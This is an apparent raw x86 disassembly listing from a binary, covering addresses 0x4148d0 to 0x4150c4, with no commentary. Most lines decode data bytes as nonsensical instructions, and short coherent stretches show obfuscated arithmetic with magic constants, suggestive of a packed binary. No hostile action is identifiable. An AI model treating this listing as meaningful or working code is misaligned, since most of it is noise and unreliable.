  4148d0:	lods   eax,DWORD PTR ds:[esi]
  4148d1:	add    eax,0x4e4e5133
  4148d6:	in     al,0xc0
  4148d8:	stos   DWORD PTR es:[edi],eax
  4148d9:	enter  0x4d69,0xd
  4148dd:	or     eax,edi
  4148df:	mov    ebx,0x4df908f2
  4148e4:	iret   
  4148e5:	lock vpmacsswd xmm12,xmm1,xmm0,xmm2
  4148ec:	mov    ds,edi
  4148ee:	xchg   ebp,eax
  4148ef:	adc    DWORD PTR [ecx],0x19
  4148f2:	push   edx
  4148f3:	stos   BYTE PTR es:[edi],al
  4148f4:	mov    gs,esp
  4148f6:	es popa 
  4148f8:	mov    eax,0x18c56b9a
  4148fd:	test   al,0xe2
  4148ff:	imul   eax,DWORD PTR [esi-0x20055758],0x700a392c
  414909:	mov    bl,0x49
  41490b:	jbe    0x4148a9
  41490d:	mov    WORD PTR [ebx],gs
  41490f:	jno    0x4148e0
  414911:	fdiv   st(4),st
  414913:	(bad)  
  414914:	cld    
  414915:	adc    eax,0x49f3d4f1
  41491a:	or     dh,ch
  41491c:	icebp  
  41491d:	stc    
  41491e:	cs cmp al,0x55
  414921:	test   BYTE PTR [eax-0x6606b18e],dl
  414927:	and    al,0xae
  414929:	pop    ebp
  41492a:	out    0xa1,al
  41492c:	or     eax,0x232eeeee
  414931:	mov    ebx,0x894b04ab
  414936:	mov    al,0xd0
  414938:	repz add DWORD PTR [ebx+0x51],esp
  41493c:	xor    esi,DWORD PTR [esi]
  41493e:	cmp    eax,ecx
  414940:	cmp    bl,BYTE PTR [ebx-0xd46c3fa]
  414946:	mov    ch,0x2d
  414948:	mov    ecx,DWORD PTR [ebp-0x4]
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x4f
  414996:	jnp    0x41497d
  414998:	stos   BYTE PTR es:[edi],al
  414999:	mov    ebx,DWORD PTR [eax+ebx*1]
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    BYTE PTR [ecx+0x5e293bd2],ch
  4149a6:	popa   
  4149a7:	arpl   WORD PTR [ecx-0x3518b81e],ax
  4149ad:	fisttp QWORD PTR [edi+0x3889f0b1]
  4149b3:	pop    esi
  4149b4:	mov    edi,0x4985df1f
  4149b9:	dec    eax
  4149ba:	jmp    0x414a2a
  4149bc:	xor    BYTE PTR [eax],cl
  4149be:	stos   BYTE PTR es:[edi],al
  4149bf:	les    edx,FWORD PTR ds:0xe398486f
  4149c5:	adc    DWORD PTR [edi-0x9d13cb3],ebp
  4149cb:	push   esp
  4149cc:	sahf   
  4149cd:	sahf   
  4149ce:	xor    eax,0xe01fc2e4
  4149d3:	pushf  
  4149d4:	idiv   DWORD PTR [ecx+ecx*1+0x599011dd]
  4149db:	or     al,0xff
  4149dd:	ins    BYTE PTR es:[edi],dx
  4149de:	test   BYTE PTR ds:[ebx+edi*1+0x1d6fa992],bh
  4149e6:	ss fdivr st,st(2)
  4149e9:	xchg   ebx,eax
  4149ea:	fld    st(2)
  4149ec:	icebp  
  4149ed:	xlat   BYTE PTR ds:[ebx]
  4149ee:	shl    BYTE PTR [ebp+0x46],cl
  4149f1:	and    BYTE PTR [ecx+0x42],al
  4149f4:	in     eax,dx
  4149f5:	rol    BYTE PTR [ebx],0xc6
  4149f8:	inc    edx
  4149f9:	andnps xmm5,xmm2
  4149fc:	fcom   QWORD PTR [ebp-0x43]
  4149ff:	ja     0x414a4a
  414a01:	lock jns 0x4149cd
  414a04:	and    DWORD PTR [ebp+0x30],edx
  414a07:	or     eax,0x881059c8
  414a0c:	mov    ebx,0xae64a577
  414a11:	or     cl,0x6
  414a14:	pop    ebx
  414a15:	xlat   BYTE PTR ds:[ebx]
  414a16:	inc    eax
  414a17:	adc    BYTE PTR ds:0x24872ceb,ah
  414a1d:	dec    esi
  414a1e:	cli    
  414a1f:	rol    BYTE PTR [eax+ecx*4],1
  414a22:	lock sbb al,0xc1
  414a25:	sbb    al,0x43
  414a27:	xor    DWORD PTR ds:0x9570f93d,eax
  414a2d:	popf   
  414a2e:	push   cs
  414a2f:	out    dx,al
  414a30:	fs push ebx
  414a32:	(bad)  
  414a33:	ins    DWORD PTR es:[edi],dx
  414a34:	xchg   esi,eax
  414a35:	call   0x2bb2:0xa1e3e212
  414a3c:	or     bl,BYTE PTR [esi+eax*1-0x4e]
  414a40:	xlat   BYTE PTR ds:[ebx]
  414a41:	sar    BYTE PTR [esi],cl
  414a43:	arpl   WORD PTR [ebx+0x7dff52e7],si
  414a49:	and    eax,0xb9eb8fda
  414a4e:	jle    0x414abc
  414a50:	pop    ebx
  414a51:	pop    ebp
  414a52:	push   ecx
  414a53:	sbb    ah,BYTE PTR ds:0x61015c14
  414a59:	add    DWORD PTR [eax+0x7e],ebx
  414a5c:	das    
  414a5d:	mov    dh,0x8
  414a5f:	(bad)  [edi]
  414a61:	daa    
  414a62:	cmp    al,0xfb
  414a64:	jecxz  0x414a4b
  414a66:	test   BYTE PTR [ecx+0x6457c590],bl
  414a6c:	xor    ch,BYTE PTR [ebx+0xb]
  414a6f:	scas   eax,DWORD PTR es:[edi]
  414a70:	cmp    eax,0x56b5710f
  414a75:	int3   
  414a76:	adc    bh,dl
  414a78:	adc    ecx,DWORD PTR [esi+0x5fe776ef]
  414a7e:	sub    eax,0x36da1223
  414a83:	adc    ecx,DWORD PTR [edi]
  414a85:	imul   edx,esp,0xffffffe5
  414a88:	rcl    BYTE PTR [ebx],1
  414a8a:	int    0x38
  414a8c:	push   ebx
  414a8d:	fsub   DWORD PTR [ecx]
  414a8f:	ins    BYTE PTR es:[edi],dx
  414a90:	hlt    
  414a91:	pop    ebx
  414a92:	xchg   edx,eax
  414a93:	cmp    al,0xe0
  414a95:	in     al,dx
  414a96:	dec    ebx
  414a97:	test   al,al
  414a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a9a:	mov    ecx,0x57885d6a
  414a9f:	out    0x22,eax
  414aa1:	pop    ebx
  414aa2:	(bad)  
  414aa3:	js     0x414ae9
  414aa5:	daa    
  414aa6:	inc    edx
  414aa7:	fcmovnb st,st(3)
  414aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aaa:	rcl    BYTE PTR [ebx+0x20937555],cl
  414ab0:	imul   eax,DWORD PTR [ecx+edx*4+0x2138f0ef],0x93132d35
  414abb:	pop    ebx
  414abc:	sbb    BYTE PTR [ecx-0x31c68541],al
  414ac2:	mov    dl,0x1
  414ac4:	push   esi
  414ac5:	pop    es
  414ac6:	mov    al,ds:0x7bfd06bf
  414acb:	cmp    ch,BYTE PTR [edi+0x3c]
  414ace:	retf   
  414acf:	sbb    eax,0xe1442ffc
  414ad4:	ret    
  414ad5:	pop    esp
  414ad6:	pop    es
  414ad7:	mov    eax,0xf5b00b5a
  414adc:	scas   al,BYTE PTR es:[edi]
  414add:	or     BYTE PTR [eax],dh
  414adf:	xchg   DWORD PTR [ebp+ebx*4+0x53],edi
  414ae3:	fmul   DWORD PTR [edi-0x4cedca5e]
  414ae9:	stos   BYTE PTR es:[edi],al
  414aea:	in     eax,dx
  414aeb:	mov    ds:0xb3f25285,al
  414af0:	xor    esi,ebx
  414af2:	sbb    DWORD PTR [ebx+0x20],ecx
  414af5:	out    dx,al
  414af6:	mov    DWORD PTR [edx],0x10d3cef2
  414afc:	push   ebx
  414afd:	ss ins DWORD PTR es:[edi],dx
  414aff:	sub    ah,BYTE PTR [eax+0x50]
  414b02:	sbb    al,0x9e
  414b04:	or     al,0x37
  414b06:	mov    dl,0xed
  414b08:	sub    ebx,DWORD PTR [edx+0x3ca66152]
  414b0e:	clc    
  414b0f:	stos   BYTE PTR es:[edi],al
  414b10:	xor    ah,BYTE PTR [eax+0x43c1a756]
  414b16:	or     BYTE PTR [edx-0x10bd475e],bl
  414b1c:	push   cs
  414b1d:	cmp    BYTE PTR [ebp+0x6ebc51de],al
  414b23:	lahf   
  414b24:	jg     0x414ba1
  414b26:	cs pop eax
  414b28:	push   edi
  414b29:	js     0x414b7f
  414b2b:	sbb    BYTE PTR [ebx],0x0
  414b2e:	xlat   BYTE PTR ds:[ebx]
  414b2f:	push   eax
  414b30:	aad    0x87
  414b32:	and    eax,ebp
  414b34:	nop
  414b35:	cld    
  414b36:	jl     0x414b24
  414b38:	fidivr WORD PTR [edx]
  414b3a:	inc    esp
  414b3b:	jmp    0x2182:0xbbe3b30b
  414b42:	jg     0x414b35
  414b44:	neg    BYTE PTR [eax]
  414b46:	jae    0x414b24
  414b48:	jae    0x414b47
  414b4a:	stc    
  414b4b:	sbb    ch,dl
  414b4d:	dec    ebx
  414b4e:	or     al,0x90
  414b50:	nop
  414b51:	jecxz  0x414ba7
  414b53:	stc    
  414b54:	xor    DWORD PTR [edi-0x70adf666],eax
  414b5a:	dec    edi
  414b5b:	sahf   
  414b5c:	shl    DWORD PTR [eax-0x78],1
  414b5f:	call   0x26ad771a
  414b64:	ss dec edx
  414b66:	sub    esi,DWORD PTR [ecx-0x6f]
  414b69:	jae    0x414b52
  414b6b:	jns    0x414b91
  414b6d:	push   edi
  414b6e:	les    esp,FWORD PTR [ecx+0x15522b28]
  414b74:	cwde   
  414b75:	xchg   BYTE PTR [ecx+0x280ef3e7],bh
  414b7b:	inc    ebp
  414b7c:	mov    ebx,0x9172e2d8
  414b81:	jge    0x414b72
  414b83:	call   0xf6fc9b11
  414b88:	arpl   WORD PTR ss:[eax+0x3433c281],cx
  414b8f:	mov    dl,0xf2
  414b91:	(bad)  
  414b93:	mov    ebx,0xaf2f956f
  414b98:	inc    ebp
  414b99:	add    eax,0xf645a904
  414b9e:	out    0xf1,eax
  414ba0:	fisubr WORD PTR [ecx]
  414ba2:	fistp  WORD PTR [ebx-0x30]
  414ba5:	shr    DWORD PTR [edx],0x33
  414ba8:	arpl   WORD PTR [ecx],bp
  414baa:	add    al,0x4b
  414bac:	xchg   esi,eax
  414bad:	xchg   esp,eax
  414bae:	adc    dh,dh
  414bb0:	rcr    DWORD PTR [di],0x59
  414bb4:	arpl   WORD PTR [ecx],dx
  414bb6:	pop    ebp
  414bb7:	push   0x16
  414bb9:	fisub  DWORD PTR [ecx+0x3b]
  414bbc:	(bad)  
  414bbd:	(bad)  
  414bbe:	retf   
  414bbf:	sbb    al,BYTE PTR ds:0x8956b661
  414bc5:	xor    eax,0x1d605269
  414bca:	gs push ebp
  414bcc:	jno    0x414b90
  414bce:	jmp    0xcd69:0xa870813b
  414bd5:	inc    edi
  414bd6:	jns    0x414bb1
  414bd8:	and    eax,0xffffff82
  414bdb:	mov    ebx,ecx
  414bdd:	mov    dh,0x4a
  414bdf:	jno    0x414b8d
  414be1:	or     cl,BYTE PTR [edx]
  414be3:	into   
  414be4:	or     BYTE PTR [eax+0x4eb1be46],bl
  414bea:	add    esp,DWORD PTR [eax+0xf]
  414bed:	loope  0x414b92
  414bef:	xchg   ecx,eax
  414bf0:	inc    esi
  414bf1:	sub    dh,BYTE PTR [edx]
  414bf3:	ds sub eax,0x51b45edf
  414bf9:	dec    edi
  414bfa:	ds call 0x3f8469a7
  414c00:	mov    ecx,0x2f9a3063
  414c05:	popf   
  414c06:	cwde   
  414c07:	in     al,0x2b
  414c09:	test   eax,0x8d37517c
  414c0e:	and    esp,DWORD PTR [eax-0x7a]
  414c11:	lahf   
  414c12:	sub    eax,0x44181250
  414c17:	std    
  414c18:	and    ebx,0xe4f8424c
  414c1e:	loop   0x414c99
  414c20:	xor    BYTE PTR [ebx-0x3c],dl
  414c23:	les    ecx,FWORD PTR [edi+0x10106896]
  414c29:	cli    
  414c2a:	mov    fs,edi
  414c2c:	int3   
  414c2d:	push   ebp
  414c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c2f:	or     al,0xc7
  414c31:	jns    0x414bc2
  414c33:	ret    0xb7d8
  414c36:	outs   dx,BYTE PTR ds:[esi]
  414c38:	jb     0x414c7e
  414c3a:	adc    edx,edx
  414c3c:	ins    DWORD PTR es:[edi],dx
  414c3d:	retf   
  414c3e:	(bad)  
  414c3f:	sub    ebx,DWORD PTR [edi]
  414c41:	outs   dx,BYTE PTR ds:[esi]
  414c42:	sbb    BYTE PTR [ebx-0x1eb6326c],ah
  414c48:	ret    
  414c49:	in     al,dx
  414c4a:	fisub  DWORD PTR [eax]
  414c4c:	loopne 0x414cc9
  414c4e:	dec    edi
  414c4f:	(bad)  
  414c50:	jp     0x414c2f
  414c52:	popa   
  414c53:	ja     0x414c8e
  414c55:	dec    ebx
  414c56:	aas    
  414c57:	push   ss
  414c58:	or     edi,DWORD PTR [ebx+0x54]
  414c5b:	and    ah,BYTE PTR [esi]
  414c5d:	mov    esi,0xab76fd4
  414c62:	jns    0x414c0e
  414c64:	mov    dh,0x21
  414c66:	in     eax,0x98
  414c68:	and    ah,BYTE PTR [esi]
  414c6a:	xchg   edx,eax
  414c6b:	js     0x414c33
  414c6d:	cmc    
  414c6e:	gs icebp 
  414c70:	pop    eax
  414c71:	jno    0x414cd9
  414c73:	inc    ebp
  414c74:	inc    esi
  414c75:	test   dh,ch
  414c77:	jmp    0xc993815d
  414c7c:	icebp  
  414c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c7e:	bound  ecx,QWORD PTR cs:0x2c584e2e
  414c85:	ss ror bl,0x2f
  414c89:	pop    ebx
  414c8a:	cdq    
  414c8b:	test   eax,0xfb3990d7
  414c90:	push   0xa0dd840f
  414c95:	cmp    eax,0x2bfe6300
  414c9a:	test   BYTE PTR [ebx],bh
  414c9c:	hlt    
  414c9d:	data16 int3 
  414c9f:	hlt    
  414ca0:	out    0xdb,al
  414ca2:	sub    al,0x96
  414ca4:	jno    0x414c96
  414ca6:	xchg   edi,eax
  414ca7:	out    0x7e,al
  414ca9:	xchg   DWORD PTR [eax+0x27198a19],ecx
  414caf:	push   ebx
  414cb0:	or     al,0x15
  414cb2:	dec    edx
  414cb3:	inc    edx
  414cb4:	fcomp  st(4)
  414cb6:	add    BYTE PTR [ecx],0xb1
  414cb9:	lods   al,BYTE PTR es:[esi]
  414cbb:	sbb    DWORD PTR [ebp-0x22819786],0x3d
  414cc2:	push   ds
  414cc3:	jae    0x414ca5
  414cc5:	sub    al,0xb7
  414cc7:	fs pop ebp
  414cc9:	mov    ebp,0xabe29f85
  414cce:	je     0x414cfc
  414cd0:	pop    es
  414cd1:	pop    ss
  414cd2:	(bad)  ds:0xc090a675
  414cd8:	out    dx,eax
  414cd9:	test   al,0xaf
  414cdb:	mov    esp,0x8de21ba2
  414ce0:	mov    DWORD PTR [edi],ebp
  414ce2:	xor    BYTE PTR [edx+0x27],dl
  414ce5:	and    dh,BYTE PTR [ecx-0x323e33cd]
  414ceb:	loop   0x414cf3
  414ced:	or     dl,BYTE PTR [ebx]
  414cef:	jne    0x414ccb
  414cf1:	dec    eax
  414cf2:	and    eax,eax
  414cf4:	(bad)  
  414cf5:	cli    
  414cf6:	std    
  414cf7:	push   edx
  414cf8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  414cfa:	pop    esp
  414cfb:	push   esi
  414cfc:	stc    
  414cfd:	xchg   ebx,eax
  414cfe:	lea    esi,[ebp+0x48]
  414d01:	mov    ah,0x21
  414d03:	mov    ebx,0xa05c1238
  414d08:	(bad)  
  414d09:	mov    dl,0xf7
  414d0b:	mov    ds:0xad706807,al
  414d10:	fdiv   DWORD PTR [edx+0x39d8d26d]
  414d16:	gs mul bh
  414d19:	jge    0x414ca3
  414d1b:	dec    eax
  414d1c:	mov    esp,0x1da4b10d
  414d21:	sbb    ch,BYTE PTR [ecx+eax*4]
  414d24:	(bad)
  414d29:	fnstenv [eax]
  414d2b:	daa    
  414d2c:	push   edx
  414d2d:	or     al,0x63
  414d2f:	add    esp,DWORD PTR [esi-0x29424e2d]
  414d35:	xor    DWORD PTR [ebp-0x52],ebx
  414d38:	rcr    DWORD PTR [esi],cl
  414d3a:	or     eax,0x67d3d7ac
  414d3f:	adc    eax,0x3d928538
  414d44:	call   0x1dc835fc
  414d49:	add    eax,ecx
  414d4b:	mov    ecx,DWORD PTR [ebp+0x8]
  414d4e:	add    ecx,eax
  414d50:	mov    DWORD PTR [ebp+0x8],ecx
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0x2b
  414e02:	(bad)  
  414e04:	push   0x42
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx+0x37181812],dl
  414e0e:	dec    edx
  414e0f:	xchg   ebp,eax
  414e10:	sub    BYTE PTR [edi-0x42],ch
  414e13:	sub    ch,BYTE PTR [esi-0x7a12d80f]
  414e19:	mov    ds:0xcfee3d76,eax
  414e1e:	(bad)  
  414e1f:	jge    0x414df8
  414e21:	push   edi
  414e22:	pop    ebp
  414e23:	ds jg  0x414db7
  414e26:	mov    ch,BYTE PTR [edi+esi*8-0xe91c480]
  414e2d:	ret    0x5a7c
  414e30:	je     0x414e1c
  414e32:	jmp    0x53a8d9f6
  414e37:	push   esp
  414e38:	sub    ebp,ebx
  414e3a:	test   eax,0x98e76a8d
  414e3f:	fistp  DWORD PTR [eax-0x30a43fd8]
  414e45:	add    DWORD PTR ds:0x4c440b9b,ebp
  414e4b:	mov    al,0x8b
  414e4d:	jae    0x414dd4
  414e4f:	and    DWORD PTR [ecx+0x61],edx
  414e52:	and    al,0x49
  414e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e55:	jmp    0x4c0c372a
  414e5a:	loopne 0x414e23
  414e5c:	bound  ecx,QWORD PTR [esi]
  414e5e:	xchg   DWORD PTR [ebp+0x39],esp
  414e61:	push   edi
  414e62:	(bad)  
  414e63:	aaa    
  414e64:	pop    eax
  414e65:	cmp    DWORD PTR [esi+0x22df7f57],ebp
  414e6b:	jae    0x414e48
  414e6d:	or     al,0xd2
  414e6f:	adc    BYTE PTR [edx-0x46],cl
  414e72:	mov    ds:0xf5083c7c,eax
  414e77:	arpl   WORD PTR [esi],cx
  414e79:	xchg   edi,eax
  414e7a:	add    DWORD PTR [eax+0x1b73d7fd],ecx
  414e80:	(bad)  [eax+0x74]
  414e83:	sub    eax,0x44240c1a
  414e88:	or     DWORD PTR [edi],0xffffffc6
  414e8b:	add    dh,BYTE PTR [ebx-0xc2308be]
  414e91:	jecxz  0x414e5f
  414e93:	dec    eax
  414e94:	xchg   esp,eax
  414e95:	jecxz  0x414f05
  414e97:	or     BYTE PTR [ebp-0x26],bh
  414e9a:	sbb    esp,DWORD PTR [edi-0x7f95befe]
  414ea0:	test   al,0xfb
  414ea2:	push   edx
  414ea3:	out    dx,al
  414ea4:	loope  0x414eda
  414ea6:	inc    ebx
  414ea7:	loope  0x414e57
  414ea9:	gs pop ecx
  414eab:	dec    ecx
  414eac:	push   0x4daf06f4
  414eb1:	pop    es
  414eb2:	int3   
  414eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb4:	test   ah,0x4f
  414eb7:	mov    DWORD PTR [ecx-0x23901199],esi
  414ebd:	int3   
  414ebe:	jno    0x414ed1
  414ec0:	js     0x414ee0
  414ec2:	mov    WORD PTR [edi+ecx*8+0x2d],es
  414ec6:	cli    
  414ec7:	mov    dl,0x45
  414ec9:	iret   
  414eca:	into   
  414ecb:	hlt    
  414ecc:	xchg   esp,eax
  414ecd:	(bad)  
  414ece:	or     edi,DWORD PTR [edx-0x4e]
  414ed1:	rcr    DWORD PTR [ecx-0x1de1c08c],cl
  414ed7:	cld    
  414ed8:	rcr    BYTE PTR [esi+eax*1+0x497daddd],1
  414edf:	(bad)  
  414ee0:	into   
  414ee1:	pop    eax
  414ee2:	or     DWORD PTR [ecx-0x32313160],esi
  414ee8:	xchg   edi,eax
  414ee9:	leave  
  414eea:	adc    BYTE PTR [ebx],dl
  414eec:	mov    dl,BYTE PTR [esp+ebx*8+0x29a6452f]
  414ef3:	(bad)  
  414ef4:	cmp    DWORD PTR fs:[edx+0x2c85ec02],eax
  414efb:	ret    
  414efc:	das    
  414efd:	jne    0x414ec3
  414eff:	adc    DWORD PTR [eax],esp
  414f01:	lods   al,BYTE PTR ds:[esi]
  414f02:	lahf   
  414f03:	jmp    0x5fceb094
  414f08:	or     dh,dl
  414f0a:	les    ebx,FWORD PTR ds:0x368262b9
  414f10:	outs   dx,DWORD PTR ds:[esi]
  414f11:	mov    eax,0xf1056084
  414f16:	and    al,0x19
  414f18:	mov    dl,0x51
  414f1a:	xchg   ebx,eax
  414f1b:	outs   dx,BYTE PTR ds:[esi]
  414f1c:	out    dx,eax
  414f1d:	dec    edi
  414f1e:	shl    BYTE PTR [ebp+0x819f7be],1
  414f24:	mov    cl,0xd9
  414f26:	add    DWORD PTR [edi-0x90d8c7d],eax
  414f2c:	sub    bh,BYTE PTR [edx]
  414f2e:	outs   dx,DWORD PTR ds:[esi]
  414f2f:	xchg   esi,eax
  414f30:	ficom  DWORD PTR [edi+0x78]
  414f33:	dec    ebp
  414f34:	xlat   BYTE PTR ds:[ebx]
  414f35:	pop    ecx
  414f36:	xor    BYTE PTR [esi],cl
  414f38:	inc    ecx
  414f39:	dec    esi
  414f3a:	repz (bad) 
  414f3d:	xor    eax,0x49461079
  414f42:	pop    edi
  414f43:	mov    esp,0xb50f3429
  414f48:	push   ss
  414f49:	in     al,dx
  414f4a:	hlt    
  414f4b:	scas   eax,DWORD PTR es:[edi]
  414f4c:	fwait
  414f4d:	sub    ch,BYTE PTR [ebx+0x7c52993f]
  414f53:	sub    BYTE PTR [ecx],bl
  414f55:	inc    edi
  414f56:	sbb    bh,BYTE PTR [eax-0x70]
  414f59:	xchg   edx,eax
  414f5a:	pop    edi
  414f5b:	add    al,0x2
  414f5d:	sbb    BYTE PTR [eax-0x8],bl
  414f60:	push   cs
  414f61:	stc    
  414f62:	repz pop es
  414f64:	ds add eax,0x6d8f4389
  414f6a:	fsubr  QWORD PTR [eax]
  414f6c:	shl    BYTE PTR [ebx+0x4b],0xb3
  414f70:	dec    edx
  414f71:	sbb    BYTE PTR [edx],bh
  414f73:	or     dl,cl
  414f75:	dec    eax
  414f76:	in     al,0x4b
  414f78:	outs   dx,DWORD PTR ds:[esi]
  414f79:	jmp    0x775e7575
  414f7e:	xor    ebx,0x3d
  414f81:	push   esp
  414f82:	dec    esi
  414f83:	das    
  414f84:	mov    WORD PTR ds:[edx+ebp*8+0x15],cs
  414f89:	jl     0x414f23
  414f8b:	push   edx
  414f8c:	dec    edx
  414f8d:	repnz xchg ebx,eax
  414f8f:	adc    DWORD PTR [ebx-0x2c],ebx
  414f92:	ins    DWORD PTR es:[edi],dx
  414f93:	sahf   
  414f94:	mov    dl,BYTE PTR [edi]
  414f96:	shl    bh,0x4d
  414f99:	mov    bh,bh
  414f9b:	mov    cl,0x5
  414f9d:	xor    al,0x4e
  414f9f:	sbb    bh,bh
  414fa1:	lds    esp,FWORD PTR [ecx+0x40f40fca]
  414fa7:	jmp    0x415004
  414fa9:	dec    ebp
  414faa:	pop    ds
  414fab:	and    esi,DWORD PTR [ecx-0x4b]
  414fae:	cwde   
  414faf:	sub    dh,BYTE PTR [edi-0x7ef14aa5]
  414fb5:	push   ecx
  414fb6:	mov    dl,0x1d
  414fb8:	hlt    
  414fb9:	std    
  414fba:	xchg   ebp,eax
  414fbb:	and    eax,0x99421716
  414fc0:	ins    DWORD PTR es:[edi],dx
  414fc1:	imul   ecx,DWORD PTR [ebp-0x170c6765],0xffffffa7
  414fc8:	xchg   edx,eax
  414fc9:	cdq    
  414fca:	pop    ecx
  414fcb:	repz (bad) 
  414fce:	xor    bh,BYTE PTR [ecx-0x63]
  414fd1:	aas    
  414fd2:	mov    ch,0xd2
  414fd4:	and    al,0x1e
  414fd6:	sub    esi,edi
  414fd8:	aaa    
  414fd9:	(bad)  
  414fda:	adc    BYTE PTR [edx+0x2eb672e7],al
  414fe0:	push   cs
  414fe1:	hlt    
  414fe2:	push   ecx
  414fe3:	pop    ebp
  414fe4:	push   eax
  414fe5:	jb     0x415009
  414fe7:	out    0x11,eax
  414fe9:	sbb    DWORD PTR [ecx-0xd9141f1],ebx
  414fef:	jmp    0x794ce6b7
  414ff4:	mov    ch,0x3e
  414ff6:	push   esp
  414ff7:	jge    0x414f82
  414ff9:	cwde   
  414ffa:	fs jae 0x41500b
  414ffd:	mov    ds:0x9211ecae,al
  415002:	or     esp,0x58
  415005:	sub    dl,0x3c
  415008:	leave  
  415009:	rcl    dh,1
  41500b:	xor    esp,DWORD PTR ds:0xbbc8fec7
  415012:	cmp    al,0x1f
  415014:	jle    0x41500a
  415016:	jge    0x414fa9
  415018:	and    al,BYTE PTR [edi+0x7f3f30d4]
  41501e:	call   0xeb0d:0x9c2165aa
  415025:	rol    BYTE PTR [ebx+ebp*2],1
  415028:	jl     0x41502f
  41502a:	mov    esp,0x15c81906
  41502f:	shl    BYTE PTR [eax-0x46b422b7],cl
  415035:	test   DWORD PTR [ebp+0x72],esi
  415038:	push   esp
  415039:	mov    dh,dh
  41503b:	shr    DWORD PTR [ebx+esi*4+0x54419a6a],0x83
  415043:	mov    bl,ah
  415045:	or     ebx,DWORD PTR [ecx+0x576e930d]
  41504b:	add    ebx,DWORD PTR [ebx-0x62]
  41504e:	imul   ebx,esi,0x3a
  415051:	pop    esi
  415052:	mov    DWORD PTR [edi+edi*4+0x61925920],ebp
  415059:	(bad)  
  41505a:	dec    edi
  41505b:	ds mov edx,0xeeae248
  415061:	xor    BYTE PTR [esi+0x58261f05],dl
  415067:	mov    ds:0x45c723f,eax
  41506c:	sar    DWORD PTR [ecx-0x52],0x8a
  415070:	bound  esi,QWORD PTR [ebx]
  415072:	sahf   
  415073:	and    ch,BYTE PTR [edi-0x2fdda120]
  415079:	sbb    bl,bh
  41507b:	xor    bh,bl
  41507d:	sub    al,0xcf
  41507f:	cwde   
  415080:	int    0x1c
  415082:	adc    ah,BYTE PTR ds:0x8d9878c0
  415088:	push   ss
  415089:	push   ds
  41508a:	mov    cl,0x22
  41508c:	push   edx
  41508d:	jecxz  0x4150ed
  41508f:	push   ds
  415090:	push   0x1ed38940
  415095:	sub    bl,ah
  415097:	loope  0x4150a1
  415099:	pop    ecx
  41509a:	and    dl,bl
  41509c:	cld    
  41509d:	or     al,BYTE PTR [eax]
  41509f:	out    0x8d,al
  4150a1:	cwde   
  4150a2:	icebp  
  4150a3:	push   ebp
  4150a4:	neg    DWORD PTR [ebx-0x354cb193]
  4150aa:	add    esp,DWORD PTR [eax+0x32]
  4150ad:	outs   dx,DWORD PTR ds:[esi]
  4150ae:	jl     0x41507a
  4150b0:	das    
  4150b1:	cmp    BYTE PTR [eax],bl
  4150b3:	sbb    eax,0x9c560d50
  4150b8:	aam    0xbc
  4150ba:	push   edi
  4150bb:	das    
  4150bc:	stc    
  4150bd:	es sbb al,0xf5
  4150c0:	into   
  4150c1:	add    DWORD PTR [edx-0x6],edx
  4150c4:	addr16 loope 0x41506d
